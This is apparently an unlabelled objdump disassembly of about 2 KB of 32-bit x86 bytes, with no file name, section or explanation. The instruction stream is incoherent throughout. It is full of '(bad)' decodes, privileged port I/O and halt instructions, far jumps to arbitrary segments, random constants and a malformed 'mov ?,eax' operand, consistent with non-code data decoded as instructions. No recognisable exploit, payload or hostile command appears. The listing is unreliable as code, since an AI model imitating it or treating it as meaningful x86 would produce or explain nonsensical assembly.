  4020fb:	imul   ebp,ebx,0x35
  4020fe:	xchg   ecx,eax
  4020ff:	mov    ds:0x28ee38c8,eax
  402104:	jl     0x402160
  402106:	call   0x4280:0x990dab40
  40210d:	ja     0x402098
  40210f:	fstp   QWORD PTR [ecx]
  402111:	add    eax,0x6e121be0
  402116:	aam    0x4f
  402118:	xchg   edx,eax
  402119:	jns    0x4020ae
  40211b:	int    0xf7
  40211d:	jg     0x4020ef
  40211f:	iret   
  402120:	ret    
  402121:	pop    eax
  402122:	mov    eax,ds:0x751b8638
  402127:	mov    bl,0x34
  402129:	xchg   edx,eax
  40212a:	inc    ebx
  40212b:	imul   ebx,DWORD PTR [esi-0x77],0x8acf6357
  402132:	retf   
  402133:	ffree  st(0)
  402135:	inc    edx
  402136:	sbb    esp,edx
  402138:	adc    ebp,DWORD PTR [ebx+edi*4-0x15]
  40213c:	pusha  
  40213d:	xor    al,0x24
  40213f:	sub    ebp,DWORD PTR [edi+0x7b]
  402142:	btr    DWORD PTR [esi-0x1a],edi
  402146:	lds    edi,FWORD PTR [ebx+esi*8+0x1417dd35]
  40214d:	in     eax,0x5c
  40214f:	ja     0x402147
  402151:	inc    edx
  402152:	test   BYTE PTR [edi-0x6d3081e],bh
  402158:	inc    ecx
  402159:	out    dx,al
  40215a:	test   esp,0x3d6d21a8
  402160:	lea    edi,[edi+0x23]
  402163:	inc    ebp
  402164:	mov    dl,0xf6
  402166:	sar    BYTE PTR [ecx+ebx*2],1
  402169:	cmp    al,BYTE PTR [ebx]
  40216b:	jne    0x4021d5
  40216d:	in     eax,0x83
  40216f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402170:	and    DWORD PTR [ecx-0x65293187],ecx
  402176:	cmp    esp,DWORD PTR [ecx-0x5f8703c5]
  40217c:	loop   0x402150
  40217e:	cwde   
  40217f:	inc    edx
  402180:	leave  
  402181:	push   0xffffffda
  402183:	cdq    
  402184:	add    BYTE PTR [ecx],dl
  402186:	and    DWORD PTR ds:0xeaddefb0,edx
  40218c:	pop    ebp
  40218d:	push   ebp
  40218e:	or     edi,esi
  402190:	xor    BYTE PTR [edi+0x2c6634f],ch
  402196:	sti    
  402197:	sub    BYTE PTR [esp+ecx*8-0x12],bl
  40219b:	and    al,0xe9
  40219d:	or     eax,0x4810bc41
  4021a2:	pavgb  mm4,QWORD PTR [ecx+0x66393734]
  4021a9:	sbb    eax,0x3e8a9467
  4021ae:	outs   dx,BYTE PTR ds:[esi]
  4021af:	cmp    ebp,DWORD PTR [edi]
  4021b1:	mov    cl,0x39
  4021b3:	dec    edx
  4021b4:	outs   dx,DWORD PTR ds:[esi]
  4021b5:	ins    DWORD PTR es:[edi],dx
  4021b6:	lea    edx,[edi]
  4021b8:	mov    ebp,DWORD PTR [esp+ebp*2+0x55f27296]
  4021bf:	dec    ebp
  4021c0:	mov    ebx,edi
  4021c2:	jnp    0x402206
  4021c4:	clc    
  4021c5:	lock rcl cl,1
  4021c8:	mov    dh,0x2e
  4021ca:	dec    eax
  4021cb:	and    dl,BYTE PTR [eax+0x77]
  4021ce:	and    ecx,DWORD PTR [esi+0x14]
  4021d1:	(bad)  
  4021d2:	dec    ecx
  4021d3:	hlt    
  4021d4:	sub    BYTE PTR ds:0xc3fe3d77,ah
  4021da:	cmp    DWORD PTR [ebp+0x1973cf7a],edi
  4021e0:	mov    edx,0xc6bf68a1
  4021e5:	pop    ds
  4021e6:	gs or  al,bl
  4021e9:	push   0x159d1fde
  4021ee:	cmp    DWORD PTR [edi+0x16],esp
  4021f1:	xchg   ecx,eax
  4021f2:	mov    bh,0x70
  4021f4:	scas   eax,DWORD PTR es:[edi]
  4021f5:	pop    ecx
  4021f6:	dec    ecx
  4021f7:	out    0x2e,eax
  4021f9:	popa   
  4021fa:	jg     0x402198
  4021fc:	jb     0x40222a
  4021fe:	dec    edi
  4021ff:	mov    DWORD PTR [ebp-0x74],esp
  402202:	test   edx,edx
  402204:	shl    edi,0x98
  402207:	mov    dl,dl
  402209:	mov    bl,0xc0
  40220b:	mov    DWORD PTR [eax+eax*4],edx
  40220e:	ret    
  40220f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  402211:	mov    esp,0x12b879b9
  402216:	ficomp WORD PTR [edx]
  402218:	mov    ss,WORD PTR ds:0xf4029e01
  40221e:	add    BYTE PTR [edx+0x1ca2db25],dl
  402224:	adc    eax,0x6fad8826
  402229:	fadd   st,st(2)
  40222b:	jl     0x402281
  40222d:	pop    es
  40222e:	ror    BYTE PTR [ebx],1
  402230:	loopne 0x4021fb
  402232:	jmp    0x4022b2
  402234:	fnstenv [ebx+0x7dbe6ac6]
  40223a:	dec    esi
  40223b:	imul   esp,DWORD PTR [ebp+edx*1-0x25b18885],0x8b75f27a
  402246:	lahf   
  402247:	int    0x8
  402249:	mov    dh,0x5e
  40224b:	add    dh,BYTE PTR ss:[eax-0x45357d18]
  402252:	addr16 out 0x2d,al
  402255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402256:	jmp    0x63b4:0x87d350ca
  40225d:	cmp    bl,dh
  40225f:	cwde   
  402260:	daa    
  402261:	scas   eax,DWORD PTR es:[edi]
  402262:	lods   al,BYTE PTR ds:[esi]
  402263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402264:	push   0x73
  402266:	neg    BYTE PTR [eax]
  402268:	scas   al,BYTE PTR es:[edi]
  402269:	test   al,0x1c
  40226b:	arpl   bp,dx
  40226d:	cdq    
  40226e:	adc    cl,BYTE PTR [esp+ecx*2-0x3e0be664]
  402275:	adc    DWORD PTR [edx-0x479c57aa],ebx
  40227b:	mov    ah,BYTE PTR [ebp+0x3b]
  40227e:	pop    gs
  402280:	mov    fs,WORD PTR [ebp+0x1e26eaba]
  402286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402287:	xchg   ebp,eax
  402288:	push   esi
  402289:	ret    0x7f55
  40228c:	pop    ecx
  40228d:	mov    bl,0x34
  40228f:	ins    BYTE PTR es:[edi],dx
  402290:	inc    edi
  402291:	cmp    al,bh
  402293:	mov    esi,0x13855a9b
  402298:	xchg   BYTE PTR [ebp-0x77],al
  40229b:	add    eax,0x812ed1a9
  4022a0:	cwde   
  4022a1:	hlt    
  4022a2:	dec    esi
  4022a3:	xor    DWORD PTR ss:[ebx],ebx
  4022a6:	pop    ss
  4022a7:	dec    ebp
  4022a8:	push   esi
  4022a9:	jbe    0x4022f7
  4022ab:	bound  edx,QWORD PTR [eax]
  4022ad:	je     0x402279
  4022af:	pop    ds
  4022b0:	lods   al,BYTE PTR ds:[esi]
  4022b1:	mov    al,ds:0x5776788c
  4022b6:	aaa    
  4022b7:	pop    ebp
  4022b8:	jnp    0x402268
  4022ba:	aad    0x19
  4022bc:	popa   
  4022bd:	dec    eax
  4022be:	jmp    0x429b21b7
  4022c3:	mov    cl,0xaf
  4022c5:	dec    eax
  4022c6:	sbb    cl,0x32
  4022c9:	fdiv   DWORD PTR [ecx+0x4b]
  4022cc:	xchg   ebx,eax
  4022cd:	xchg   edx,eax
  4022ce:	xor    DWORD PTR [esi],ebp
  4022d0:	and    ah,bl
  4022d2:	push   ebx
  4022d3:	dec    edi
  4022d4:	inc    ecx
  4022d5:	and    DWORD PTR [ebp-0x523b83f6],edx
  4022db:	cmp    dl,bl
  4022dd:	daa    
  4022de:	mov    al,ds:0xe9621887
  4022e3:	stos   BYTE PTR es:[edi],al
  4022e4:	pop    es
  4022e5:	or     BYTE PTR [ebx+0x25],0xb6
  4022e9:	sbb    al,0x8
  4022eb:	mov    ah,0x9
  4022ed:	jne    0x4022c2
  4022ef:	rcr    ebx,cl
  4022f1:	test   BYTE PTR [edi+0x6b],dl
  4022f4:	xchg   edx,eax
  4022f5:	sti    
  4022f6:	(bad)  
  4022f7:	outs   dx,BYTE PTR ds:[esi]
  4022f8:	fnsave [ebx+0x2a]
  4022fb:	aas    
  4022fc:	or     eax,0x7abc9bb3
  402301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402302:	xchg   ebp,eax
  402303:	cld    
  402304:	mov    edi,0x753f4c4
  402309:	and    al,BYTE PTR [edi]
  40230b:	fidiv  WORD PTR [ecx-0x24]
  40230e:	(bad)  
  40230f:	jno    0x402325
  402311:	mov    eax,0xc7b20d74
  402316:	push   ss
  402317:	mov    eax,0xfbb30aec
  40231c:	sar    BYTE PTR [edx],cl
  40231e:	fiadd  WORD PTR [esi-0x1254cae9]
  402324:	ret    0x88c5
  402327:	xor    al,0x67
  402329:	stos   BYTE PTR es:[edi],al
  40232a:	push   ss
  40232b:	js     0x402325
  40232d:	outs   dx,DWORD PTR ds:[esi]
  40232e:	iret   
  40232f:	push   cs
  402330:	cwde   
  402331:	add    BYTE PTR [esi+0x1fb76533],cl
  402337:	mov    edi,0x59c22471
  40233c:	jle    0x40239c
  40233e:	push   ecx
  40233f:	mov    bh,0xad
  402341:	nop
  402342:	push   edi
  402343:	xchg   ebp,eax
  402344:	int    0x44
  402346:	clc    
  402347:	sub    DWORD PTR [edi],esi
  402349:	xchg   ebx,eax
  40234a:	mov    cl,0xa5
  40234c:	sub    eax,0x3546f454
  402351:	mov    al,0x5e
  402353:	shl    DWORD PTR [eax-0x6f],1
  402356:	sbb    BYTE PTR [esi],0x3c
  402359:	push   0x4c
  40235b:	xlat   BYTE PTR ds:[ebx]
  40235c:	sahf   
  40235d:	lea    ebx,[edi+ecx*2-0x80]
  402361:	int3   
  402362:	es fs push esp
  402365:	jp     0x4023c6
  402367:	and    bl,ah
  402369:	popf   
  40236a:	stc    
  40236b:	sub    bl,BYTE PTR [eax+0x42]
  40236e:	xlat   BYTE PTR ds:[ebx]
  40236f:	test   cl,bl
  402371:	mov    esi,0xdac3943d
  402376:	hlt    
  402377:	mov    ch,0x86
  402379:	(bad)  
  40237a:	nop
  40237b:	push   esp
  40237c:	dec    ebp
  40237d:	add    eax,0xd3bc1d72
  402382:	xor    BYTE PTR [ecx],bl
  402384:	cs ins BYTE PTR es:[edi],dx
  402386:	lahf   
  402387:	jo     0x40233f
  402389:	xchg   ebp,eax
  40238a:	add    BYTE PTR [edi],dh
  40238c:	xor    al,0x60
  40238e:	test   al,0x9f
  402390:	ret    0xd339
  402393:	or     al,0x36
  402395:	loope  0x40240a
  402397:	jmp    0x40238c
  402399:	repnz xor cl,BYTE PTR [ecx-0x2d]
  40239d:	in     eax,dx
  40239e:	sbb    cl,BYTE PTR [ebp-0x31]
  4023a1:	xchg   ecx,eax
  4023a2:	fwait
  4023a3:	int3   
  4023a4:	lea    esp,[ebx+0x4c]
  4023a7:	(bad)  
  4023a8:	scas   al,BYTE PTR es:[edi]
  4023a9:	jbe    0x402395
  4023ab:	adc    ecx,edi
  4023ad:	dec    eax
  4023ae:	pop    ds
  4023af:	int3   
  4023b0:	jge    0x40235e
  4023b2:	mov    ds:0xeed47c74,eax
  4023b8:	xchg   edi,eax
  4023b9:	mov    dh,0x11
  4023bb:	cwde   
  4023bc:	test   eax,0x7e42d578
  4023c1:	gs jbe 0x40241d
  4023c4:	cmp    eax,0xb41f88e
  4023c9:	xchg   edi,eax
  4023ca:	fisub  DWORD PTR [edi+ebp*1]
  4023cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023ce:	inc    edx
  4023cf:	ret    
  4023d0:	stos   DWORD PTR es:[edi],eax
  4023d1:	sbb    DWORD PTR [ebp+0x50d3ad8a],edx
  4023d7:	push   ebx
  4023d8:	gs in  al,0x35
  4023db:	lahf   
  4023dc:	xchg   edx,eax
  4023dd:	sbb    BYTE PTR [edi+ebx*2],dl
  4023e0:	or     bl,BYTE PTR [ebx+0x60309e72]
  4023e6:	int3   
  4023e7:	in     al,dx
  4023e8:	sbb    edi,DWORD PTR [esi]
  4023ea:	enter  0xfbaf,0xf3
  4023ee:	xor    eax,0x3984d5ba
  4023f3:	sar    ebp,0x33
  4023f6:	minps  xmm2,XMMWORD PTR [ecx+0x1a]
  4023fa:	push   0xffffffff
  4023fc:	push   0xcf0bc8e6
  402401:	ret    0xa524
  402404:	sbb    ebx,DWORD PTR [edi+0x12741fbc]
  40240a:	mov    BYTE PTR [eax+0x75],bl
  40240d:	dec    ebx
  40240e:	adc    edx,DWORD PTR [ebp-0x1c]
  402411:	sbb    eax,0x32172a0d
  402416:	dec    eax
  402417:	xor    eax,0x4e5553f0
  40241c:	arpl   WORD PTR [ecx+esi*8-0x2c],cx
  402420:	cmp    DWORD PTR [eax+0xe554fcd],ecx
  402426:	push   edi
  402427:	pop    edx
  402428:	mov    eax,ds:0xda54df41
  40242d:	je     0x4023ea
  40242f:	sub    ch,ah
  402431:	push   ds
  402432:	out    dx,al
  402433:	or     al,0x63
  402435:	hlt    
  402436:	les    edx,FWORD PTR [edx-0x39]
  402439:	jns    0x402470
  40243b:	rol    BYTE PTR [esi-0x2c],1
  40243e:	mov    ds:0xc3f0be68,eax
  402443:	sbb    bh,BYTE PTR [edi]
  402445:	outs   dx,DWORD PTR ds:[esi]
  402446:	pop    edi
  402447:	aam    0xa3
  402449:	in     al,0x57
  40244b:	gs and eax,0x57575ec
  402451:	mov    cl,0xc2
  402453:	mov    bl,0x5d
  402455:	xchg   ecx,eax
  402456:	test   BYTE PTR [edx-0x51],cl
  402459:	aaa    
  40245a:	sub    DWORD PTR [ebp+0x10],esi
  40245d:	arpl   WORD PTR [eax],di
  40245f:	sahf   
  402460:	or     DWORD PTR [edx-0x64],eax
  402463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402464:	xlat   BYTE PTR ds:[ebx]
  402465:	pop    edx
  402466:	dec    eax
  402467:	test   BYTE PTR [ecx+eax*1-0x46],bh
  40246b:	xchg   esp,eax
  40246c:	ror    cl,cl
  40246e:	dec    edi
  40246f:	adc    al,0xa2
  402471:	add    dx,WORD PTR [edi+0x5e0ab091]
  402478:	xchg   ebx,eax
  402479:	xchg   ebx,eax
  40247a:	(bad)  
  40247b:	sar    DWORD PTR [edx-0x51],1
  40247e:	cdq    
  40247f:	loopne 0x402416
  402481:	dec    esi
  402482:	ret    0x9b4d
  402485:	inc    esp
  402486:	dec    eax
  402487:	fimul  DWORD PTR [ebx]
  402489:	call   0x5686:0x84392b54
  402490:	popf   
  402491:	scas   al,BYTE PTR es:[edi]
  402492:	fs mov dh,0x8e
  402495:	repnz sub ebx,ebp
  402498:	jg     0x4024d9
  40249a:	test   DWORD PTR [eax+0x52e726f9],ebp
  4024a0:	push   eax
  4024a1:	(bad)  
  4024a2:	mov    ebp,0x4c927469
  4024a7:	or     al,0xb6
  4024a9:	pop    ebp
  4024aa:	mov    ds:0xd09a7fd0,al
  4024af:	mov    ah,0x5b
  4024b1:	and    BYTE PTR ds:[ebx],dh
  4024b4:	pop    esi
  4024b5:	in     eax,0xf8
  4024b7:	mov    dh,0xa8
  4024b9:	mov    dl,0xf
  4024bb:	(bad)  
  4024bc:	shl    DWORD PTR [edi],cl
  4024be:	dec    esp
  4024bf:	pop    edx
  4024c0:	shr    BYTE PTR [edx-0x7e],cl
  4024c3:	push   0xc2b556bb
  4024c8:	push   eax
  4024c9:	sbb    dh,BYTE PTR [ebx]
  4024cb:	mov    ds:0xf336748c,al
  4024d0:	pop    ss
  4024d1:	cmp    dl,BYTE PTR [edx+0xf5200b7]
  4024d7:	gs pusha 
  4024d9:	outs   dx,BYTE PTR ds:[esi]
  4024da:	cs aaa 
  4024dc:	sub    BYTE PTR ss:[eax],al
  4024df:	add    BYTE PTR [ebp-0x83d403],ah
  4024e5:	in     al,dx
  4024e6:	nop
  4024e7:	stos   BYTE PTR es:[edi],al
  4024e8:	scas   al,BYTE PTR es:[edi]
  4024e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024ea:	pop    edx
  4024eb:	xchg   esi,eax
  4024ec:	pop    edx
  4024ed:	cwde   
  4024ee:	xlat   BYTE PTR ds:[ebx]
  4024ef:	call   0x801121b3
  4024f4:	xor    al,0x65
  4024f6:	addr16 jb 0x4024d6
  4024f9:	dec    ebp
  4024fa:	mov    WORD PTR [ecx+0x236680d4],ss
  402500:	hlt    
  402501:	mov    ch,0x2f
  402503:	mov    cl,0x3e
  402505:	retf   
  402506:	sbb    al,0x3
  402508:	mov    al,0x52
  40250a:	lds    esp,FWORD PTR [edi]
  40250c:	mov    dl,0x37
  40250e:	xor    al,0xb0
  402510:	scas   al,BYTE PTR es:[edi]
  402511:	dec    ebp
  402512:	jg     0x4024ab
  402514:	(bad)  
  402516:	dec    ecx
  402517:	dec    edi
  402518:	hlt    
  402519:	aad    0x6d
  40251b:	xchg   ah,al
  40251d:	pop    ss
  40251e:	pop    es
  40251f:	mov    edx,0xfba853ee
  402524:	sbb    eax,0x59ffd60f
  402529:	test   DWORD PTR [edi],esi
  40252b:	retf   0xfd7
  40252e:	adc    ah,BYTE PTR [ebx+0x3aa29a9f]
  402534:	scas   eax,DWORD PTR es:[edi]
  402535:	mov    eax,0x18d68711
  40253a:	sar    DWORD PTR [ebp+0x4bfe2e50],1
  402540:	es mov eax,0x68b4a240
  402546:	fwait
  402547:	cmc    
  402548:	xchg   eax,esi
  40254a:	test   ah,al
  40254c:	pop    ecx
  40254d:	enter  0xdfa8,0x18
  402551:	fmul   st(6),st
  402553:	and    al,BYTE PTR [eax+ebp*2]
  402556:	fbstp  TBYTE PTR [ebp-0x50344223]
  40255c:	repnz (bad) 
  40255f:	jno    0x4025c9
  402561:	jae    0x40255c
  402563:	adc    cl,ah
  402565:	cmp    BYTE PTR [ecx+0x4],bl
  402568:	ret    
  402569:	and    edx,eax
  40256b:	mov    BYTE PTR [ecx-0x5702ccc3],dh
  402571:	sbb    al,al
  402573:	jg     0x40256c
  402575:	xchg   BYTE PTR [ecx-0x37],ah
  402578:	jae    0x40252d
  40257a:	pusha  
  40257b:	mov    WORD PTR [ebp-0x623bcae4],cs
  402581:	int    0xf1
  402583:	cwde   
  402584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402585:	mov    eax,ds:0xf4ff0179
  40258a:	cmc    
  40258b:	in     eax,dx
  40258c:	add    al,0xb9
  40258e:	inc    ebp
  40258f:	sbb    edx,DWORD PTR [eax]
  402591:	ja     0x402579
  402593:	ja     0x402523
  402595:	ins    DWORD PTR es:[edi],dx
  402596:	push   0x96db44a5
  40259b:	or     dh,BYTE PTR [eax+0x1d]
  40259e:	cli    
  40259f:	shr    ch,1
  4025a1:	pop    ebx
  4025a2:	or     dh,ch
  4025a4:	push   ds
  4025a5:	inc    ecx
  4025a6:	arpl   ax,cx
  4025a8:	or     eax,0x732b2f77
  4025ad:	push   ebp
  4025ae:	bound  edx,QWORD PTR [esi-0x125ba593]
  4025b4:	aaa    
  4025b5:	js     0x40254a
  4025b7:	sbb    ecx,DWORD PTR [ebp-0xb5943b1]
  4025bd:	mov    esp,0x6e1c01c3
  4025c2:	cmp    eax,0x6b5aaee4
  4025c7:	fisub  DWORD PTR [edx]
  4025c9:	out    dx,al
  4025ca:	fbld   TBYTE PTR [ebx]
  4025cc:	jbe    0x40257d
  4025ce:	dec    ecx
  4025cf:	inc    ebx
  4025d0:	xchg   esi,eax
  4025d1:	sub    al,0x29
  4025d3:	or     edi,eax
  4025d5:	mov    edi,0xe7692962
  4025da:	push   esi
  4025db:	push   esp
  4025dc:	sub    eax,0xc85db2f2
  4025e1:	push   esp
  4025e2:	mov    edi,esp
  4025e4:	push   esi
  4025e5:	mov    ds:0xd2506730,eax
  4025ea:	mov    al,ds:0xe90a1b33
  4025ef:	loopne 0x4025d9
  4025f1:	out    dx,al
  4025f2:	int    0x44
  4025f4:	adc    ecx,DWORD PTR [ebx+ebp*4+0x15]
  4025f8:	cmp    al,0x2b
  4025fa:	loope  0x4025b5
  4025fc:	pusha  
  4025fd:	jae    0x40266f
  4025ff:	out    0x19,eax
  402601:	jecxz  0x402602
  402603:	call   0x5d0418a
  402608:	sub    al,0xf5
  40260a:	mov    edi,0x2c689ef9
  40260f:	push   esp
  402610:	repnz stos DWORD PTR es:[edi],eax
  402612:	popf   
  402613:	arpl   WORD PTR [esi],bp
  402615:	ins    DWORD PTR es:[edi],dx
  402616:	mov    eax,0x34c4e4d3
  40261b:	mov    fs,WORD PTR [edx+0x1a2b67c6]
  402621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402622:	lock xor esi,DWORD PTR [esi]
  402625:	mov    DWORD PTR [edi+edx*2-0x992e85],edx
  40262c:	or     al,0x1c
  40262e:	mov    BYTE PTR [ebx],dl
  402630:	add    eax,DWORD PTR [edi]
  402632:	pop    edx
  402633:	in     eax,0x87
  402635:	sub    BYTE PTR ds:0x173c0a36,0x20
  40263c:	fwait
  40263d:	mov    edx,0xf02d5d18
  402642:	fisubr WORD PTR [edx-0x59ba91d3]
  402648:	jmp    0x8a3e:0xd6301353
  40264f:	je     0x4025f6
  402651:	into   
  402652:	loopne 0x402689
  402654:	adc    BYTE PTR [esi],al
  402656:	les    edx,FWORD PTR [ebp+0x44ce3be1]
  40265c:	add    eax,0x3a1c0e57
  402661:	or     eax,0xceb9d78d
  402666:	push   es
  402667:	sub    al,0xa3
  402669:	(bad)  
  40266a:	in     al,dx
  40266b:	or     DWORD PTR [ebp-0x62],eax
  40266e:	jnp    0x4025fd
  402670:	push   0xc7a93a68
  402675:	pop    es
  402676:	cmp    DWORD PTR [edi+0x6d],eax
  402679:	icebp  
  40267a:	(bad)  
  40267b:	or     al,0x36
  40267d:	cdq    
  40267e:	cmp    esp,esp
  402680:	xchg   ecx,eax
  402681:	jmp    0x21c5:0x717b3ac5
  402688:	mov    edx,0xe969cdb3
  40268d:	xor    ah,BYTE PTR ds:0x9a120a83
  402693:	hlt    
  402694:	loope  0x4026be
  402696:	out    dx,eax
  402697:	std    
  402698:	mov    eax,ds:0x1863760b
  40269d:	retf   0xbd88
  4026a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026a1:	bound  esp,QWORD PTR [ecx-0x7f6f923d]
  4026a7:	xor    DWORD PTR [edi+0x5178360d],esp
  4026ad:	or     DWORD PTR [edx-0x3],edx
  4026b0:	or     DWORD PTR [ebx+0x43],ecx
  4026b3:	jmp    0x40272e
  4026b5:	mov    esi,0x6178a6c8
  4026ba:	push   edi
  4026bb:	fs ret 0x12fc
  4026bf:	lds    ebx,FWORD PTR [edx]
  4026c1:	aas    
  4026c2:	or     DWORD PTR [ebx],esi
  4026c4:	jg     0x40264a
  4026c6:	out    0xb5,al
  4026c8:	jbe    0x40270b
  4026ca:	lds    ecx,FWORD PTR [esi-0x9]
  4026cd:	and    BYTE PTR [ebx],bh
  4026cf:	shl    BYTE PTR [ebp-0x3b092823],cl
  4026d5:	dec    ebp
  4026d6:	call   0x7f63:0xc1e9377f
  4026dd:	(bad)  
  4026de:	xor    BYTE PTR [eax],al
  4026e0:	mov    esi,0x847b2cf2
  4026e5:	pusha  
  4026e6:	jmp    0x402708
  4026e8:	adc    ecx,DWORD PTR [ebx+0x3d]
  4026eb:	test   ah,dh
  4026ed:	imul   ebp,DWORD PTR [eax],0xffffffb6
  4026f0:	jbe    0x402678
  4026f2:	inc    eax
  4026f3:	push   eax
  4026f4:	sub    BYTE PTR [eax-0x6cb9279a],0x8b
  4026fb:	mov    ah,0xd2
  4026fd:	pop    es
  4026fe:	les    edi,FWORD PTR [ecx+ebx*8-0x7a4c0ea2]
  402705:	add    bh,BYTE PTR [edx+0x76e0eba3]
  40270b:	cmp    eax,0x5ddf66c0
  402710:	clc    
  402711:	in     eax,dx
  402712:	adc    eax,0x1988d07e
  402717:	push   esi
  402718:	in     eax,dx
  402719:	sahf   
  40271a:	pop    ebx
  40271b:	scas   al,BYTE PTR es:[edi]
  40271c:	jne    0x4026df
  40271e:	ds js  0x4026ad
  402721:	push   esi
  402722:	scas   al,BYTE PTR es:[edi]
  402723:	xchg   esi,eax
  402724:	repnz mov ds:0xedb16fde,eax
  40272a:	mov    bl,0x7a
  40272c:	dec    eax
  40272d:	fbstp  TBYTE PTR [esi+0x19]
  402730:	loopne 0x40272f
  402732:	xchg   DWORD PTR es:0x926a6d84,ecx
  402739:	loope  0x40276b
  40273b:	xchg   edi,eax
  40273c:	jns    0x4026e4
  40273e:	icebp  
  40273f:	mov    dl,0x3e
  402741:	mov    ds:0xe7c80840,al
  402746:	lods   eax,DWORD PTR ds:[esi]
  402747:	fild   QWORD PTR [ebp-0x37]
  40274a:	jno    0x402713
  40274c:	jecxz  0x4026f4
  40274e:	dec    ecx
  40274f:	imul   ebp,eax,0x6ccd3bb5
  402755:	fmul   QWORD PTR [edi+ecx*4-0x428d1a75]
  40275c:	(bad)  
  40275d:	sbb    DWORD PTR [eax-0x12481b79],ecx
  402763:	mov    BYTE PTR [esi-0x37],dh
  402766:	(bad)  [ebx]
  402768:	in     eax,0x65
  40276a:	in     al,dx
  40276b:	mov    ch,0x3e
  40276d:	inc    ebx
  40276e:	ds cwde 
  402770:	loop   0x4026f7
  402772:	or     ch,BYTE PTR [ebx+0x6c77c478]
  402778:	sub    al,0xfc
  40277a:	sar    DWORD PTR [ecx],0xd6
  40277d:	rcr    BYTE PTR [esp+ebx*2],cl
  402780:	mov    esp,0xc995325e
  402785:	xor    al,0x76
  402787:	fs repnz inc ecx
  40278a:	out    dx,eax
  40278b:	fistp  WORD PTR [ecx+0x2]
  40278e:	aaa    
  40278f:	popa   
  402790:	xchg   ecx,eax
  402791:	jbe    0x4027b8
  402793:	cmc    
  402794:	push   eax
  402795:	shl    BYTE PTR [esi+0x5e],0xb0
  402799:	add    DWORD PTR [esi+0x2],ebx
  40279c:	test   al,0xec
  40279e:	xchg   esi,eax
  40279f:	pop    es
  4027a0:	into   
  4027a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027a2:	repz add ah,cl
  4027a5:	mov    bh,0xf1
  4027a7:	mov    ds:0xc65150fd,al
  4027ac:	shl    DWORD PTR [ecx-0xf],cl
  4027af:	fisub  DWORD PTR [esi+0x3e]
  4027b2:	xor    eax,0xfeb2da5e
  4027b7:	lea    edi,ds:0x8ff10ee3
  4027bd:	outs   dx,BYTE PTR ds:[esi]
  4027be:	idiv   DWORD PTR [edi-0x16]
  4027c1:	cld    
  4027c2:	jmp    0x21847bcc
  4027c7:	lods   al,BYTE PTR ds:[esi]
  4027c8:	js     0x4027ec
  4027ca:	mov    esi,0x38872ff
  4027cf:	mov    bh,BYTE PTR [edi-0x45ac87a3]
  4027d5:	lods   al,BYTE PTR ds:[esi]
  4027d6:	arpl   WORD PTR [esi],si
  4027d8:	mov    ebx,0x93f687c0
  4027dd:	cs pop es
  4027df:	mov    edx,0xb931540d
  4027e4:	add    ch,BYTE PTR [esi+0x10]
  4027e7:	fnsave [ebx]
  4027e9:	mov    ?,eax
  4027eb:	mov    ebp,ebx
  4027ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ee:	mov    ah,0x6f
  4027f0:	inc    esp
  4027f1:	lds    edx,FWORD PTR [ecx-0x63]
  4027f4:	inc    esp
  4027f5:	add    al,0x8a
  4027f7:	mov    ebp,0xe5caa626
  4027fc:	jae    0x4027b3
  4027fe:	pop    esp
  4027ff:	data16 das 
  402801:	push   0x47
  402803:	push   eax
  402804:	push   es
  402805:	pop    ecx
  402806:	lea    edi,ds:0xa780555
  40280c:	cs iret 
  40280e:	vxorps ymm0,ymm6,YMMWORD PTR [eax]
  402812:	jp     0x40282b
  402814:	mov    DWORD PTR ds:0xbceffddd,edx
  40281a:	sahf   
  40281b:	imul   ebp,DWORD PTR [esi-0xb],0x3bd58fc1
  402822:	xor    DWORD PTR [edi-0x30],esp
  402825:	mov    ds:0x89e5d255,eax
  40282a:	out    0x64,eax
  40282c:	arpl   WORD PTR [ecx+esi*2],cx
  40282f:	mov    bl,0x35
  402831:	xchg   edx,eax
  402832:	bound  edi,QWORD PTR [eax+0x7b22ee32]
  402838:	mov    ds:0x2f5d6b0a,al
  40283d:	xor    bh,BYTE PTR [ebx+0x5837ae04]
  402843:	inc    ebx
  402844:	sahf   
  402845:	and    ebp,DWORD PTR [ebp-0x74]
  402848:	adc    ebp,edx
  40284a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40284b:	pop    eax
  40284c:	aam    0x75
  40284e:	jno    0x4028ba
  402850:	push   0xa3895b3e
  402855:	(bad)  
  402856:	mov    al,0x8b
  402858:	push   cs
  402859:	test   ecx,edi
  40285b:	mov    cl,0xf9
  40285d:	mov    eax,0x9734a49
  402862:	add    dh,BYTE PTR [esi]
  402864:	dec    ecx
  402865:	xor    edx,DWORD PTR [ebp-0x1e14d19d]
  40286b:	sub    eax,0x8d6c58dd
  402870:	out    dx,al
  402871:	xor    eax,0x1381de66
  402876:	dec    ebp
  402877:	push   ebx
  402878:	fdiv   DWORD PTR ds:0x83b63ab9
  40287e:	pop    gs
  402880:	pop    edx
  402881:	mov    ecx,0xabd4ee99
  402886:	sbb    eax,0x2fa16e03
  40288b:	adc    al,0x46
  40288d:	enter  0xa585,0xa1
  402891:	and    eax,0xa1e22fb3
  402896:	mov    ebp,0xb22108a5
  40289b:	jmp    0x91fa2f68
  4028a0:	jle    0x4028e5
  4028a2:	adc    eax,0x16e18031
  4028a7:	inc    ebp
  4028a8:	clc    
  4028a9:	mov    esi,0x55b807a7
  4028ae:	in     al,0x11
  4028b0:	add    al,0x5c
  4028b2:	sti    
  4028b3:	cwde   
  4028b4:	loop   0x402856
  4028b6:	pop    esi
  4028b7:	sub    cl,BYTE PTR [eax]
  4028b9:	arpl   WORD PTR [ebp-0x9],cx
  4028bc:	xor    eax,0x10073072
  4028c1:	sti    
  4028c2:	out    dx,al
